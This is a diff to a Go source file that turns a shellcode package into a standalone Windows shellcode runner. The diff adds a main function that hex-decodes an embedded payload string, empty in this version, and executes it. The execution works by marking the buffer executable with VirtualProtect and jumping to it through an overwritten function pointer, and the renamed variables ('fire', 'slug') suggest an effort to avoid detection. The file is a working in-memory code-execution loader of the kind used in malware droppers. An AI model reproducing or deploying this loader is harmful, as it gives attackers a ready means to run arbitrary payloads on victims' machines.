@@ -1,13 +1,25 @@
-package shellcode
+package main
 
 import (
 	"syscall"
 	"unsafe"
+	"encoding/hex"
+	"os"
 )
 
-var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
+var (
+	Kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
+	procVirtualProtect = Kernel32DLL.NewProc("VirtualProtect")
+)
+
+//var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
 
 func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
+	//LPVOID	VirtualAlloc(
+	// LPVOID	lpAddress,
+	// SIZE_T	dwSize,
+	// DWORD	flAllocationType,
+	// DWORD	flProtect
 	ret, _, _ := procVirtualProtect.Call(
 		uintptr(lpAddress),
 		uintptr(dwSize),
@@ -16,7 +28,7 @@ func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint3
 	return ret > 0
 }
 
-func Run(sc []byte) {
+func Run(fire []byte) {
 	// TODO need a Go safe fork
 	// Make a function ptr
 	f := func() {}
@@ -28,14 +40,23 @@ func Run(sc []byte) {
 	}
 
 	// Override function ptr
-	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))
+	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&fire))
 
 	// Change permissions on shellcode string data
 	var oldshellcodeperms uint32
-	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
+	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&fire))), uintptr(len(fire)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
 		panic("Call to VirtualProtect failed!")
 	}
 
 	// Call the function ptr it
 	f()
+}
+
+func main() {
+	slug := ""
+	fire, err := hex.DecodeString(slug)
+	if err != nil {
+		os.Exit(1)
+	}
+	Run(fire)
 }
